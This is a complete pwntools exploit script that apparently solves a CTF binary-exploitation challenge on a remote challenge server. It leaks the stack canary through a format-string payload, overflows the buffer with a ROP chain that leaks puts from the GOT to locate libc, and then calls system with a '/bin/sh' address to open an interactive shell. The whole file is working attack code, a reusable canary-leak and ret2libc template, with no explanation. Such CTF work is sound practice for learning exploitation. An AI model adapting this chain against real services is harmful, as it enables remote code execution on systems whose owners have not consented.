from pwn import *
from LibcSearcher import *

binary = './patched-chal'
elf = ELF(binary)
libc = ELF('./libc.so.6')

context(arch = elf.arch, log_level = 'debug', os = 'linux', terminal = ['tmux', 'splitw', '-hp', '62'])

# r = process(binary)
r = remote('chall.icohk-test.one', 35002)
# r = gdb.debug(binary, 'b* UwU_main+158\nc')

r.recvuntil(b'You can write something in the buffer for me UwU\n')
payload1 = b'%9$p'
r.sendline(payload1)
canary = int(r.recvuntil(b'\n', drop=True).decode(), 16)
log.info(f'The canary value: {hex(canary)}')

pop_rdi = 0x04012e0
ret = 0x40101a

r.recvuntil(b'Try to get the flag by writing something in the buffer again for me UwU\n')
payload2 = flat(
    b'A' * 0x18,
    canary,
    b'B' * 0x8,
    pop_rdi,
    elf.got['puts'],
    elf.sym['puts'],
    elf.sym['UwU_main']
)
r.sendline(payload2)

puts_addr = int.from_bytes(r.recvline()[:-1], 'little')
log.info(f'puts addr: {hex(puts_addr)}')
libc.address = puts_addr - libc.sym['puts']
log.info(f'libc offset: {hex(libc.address)}')

sh_addr = 0x1d8678 + libc.address
log.info(f'system addr: {hex(libc.sym["system"])}')

r.recvuntil(b'You can write something in the buffer for me UwU\n')
r.sendline('')
r.recvuntil(b'Try to get the flag by writing something in the buffer again for me UwU\n')
payload3 = flat(
    b'A' * 0x18,
    canary,
    b'B' * 0x8,
    ret,
    pop_rdi,
    sh_addr,
    libc.sym['system']
)
r.sendline(payload3)

r.interactive()